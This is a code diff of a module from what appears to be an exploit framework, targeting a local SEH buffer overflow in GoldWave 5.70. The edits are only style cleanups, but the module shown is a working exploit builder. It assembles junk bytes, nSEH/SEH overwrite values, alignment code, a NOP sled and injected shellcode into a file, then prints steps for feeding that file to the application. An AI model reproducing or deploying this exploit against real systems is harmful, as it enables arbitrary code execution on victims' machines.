@@ -1,4 +1,3 @@
-from subprocess import call, Popen, PIPE
 from module_payload import PayloadModule
 
 
@@ -9,16 +8,16 @@ class BoomerModule(PayloadModule):
                 "Exploit Author": "bzyo",
                 "Description": "GoldWave 5.70 - Local Buffer Overflow",
                 "Reference": "https://www.exploit-db.com/exploits/44423/",
-                "Arch" : "X86"
+                "Arch": "X86"
                 }
         options = {
             "file": ["File to dump payload", "files/output/dupscout.txt", False]
         }
         compatible = ["local/windows/x86/calc"]
-        super(BoomerModule, self).__init__(options,info, compatible)
-               
+        super(BoomerModule, self).__init__(options, info, compatible)
+
     def run(self):
-        junk = "\x71"*1019
+        junk = "\x71" * 1019
         nseh = "\x61\x62"
         seh = "\x0f\x6d"
         valign = (
@@ -37,16 +36,15 @@ class BoomerModule(PayloadModule):
         nops = "\x71" * 365
         fill = "\x71" * 5000
 
-        if self.payload == None:
+        if self.payload is None:
             self.print_info("put payload")
             return
         payload = self.payload.get_shellcode()
         buffer = junk + nseh + seh + valign + nops + payload + fill
         try:
-            textfile = open(self.options["file"][1] , 'w')
-            textfile.write(buffer)
-            textfile.close()
-            self.print_ok("%s generated" % self.options["file"][1])
+            with open(self.options["file"][1], 'w') as textfile:
+                textfile.write(buffer)
+            self.print_ok(f'{self.options["file"][1]} generated')
             self.print_info("""1. Open Dup Scout
             2. open gold wave app
             3. select File, Open URL...
